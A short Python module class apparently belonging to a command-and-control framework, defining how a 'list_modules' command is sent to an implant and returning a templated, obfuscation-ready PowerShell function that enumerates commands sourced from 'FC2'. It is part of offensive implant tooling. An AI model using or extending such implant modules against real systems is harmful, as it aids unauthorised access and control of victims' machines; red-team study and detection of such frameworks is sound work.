class GetLoadedModules:
    type = "ML"
    args = None
    input = "list_modules"
    # this must be unique across ALL implants, any matching keys will be merged causing errors.
    # To safely format this use the following format "<type>_variablename":"value" i.e.
    #   fd_base64_var: base64filecontents
    obfuscation_keypairs = {}

    def process_implant_response(self, data, args):
        return f"Module listing: \n{data.decode()}", None

    def implant_text(self):
        var = '''
function {{ ron.obf_get_loaded_modules }} () {
    $global:tr = Get-Command | Where {$_.Source -Like "FC2"}
}'''
        return var

    def pre_process_command(self, argument_string):
        # Check if the argument to be passed to the implant is valid.
        # I.e.
        #    Does the file to be uploaded exist local?
        #    Is the command to be executed dangerous?
        return True

    def create_module_data_string(self, cmd_entry):
        # This function is responsible for creating the string which is send to the implant
        # Format for the implant core string is:
        #   < command type > <command id><optional command arguments>
        return f"{cmd_entry['args']}"
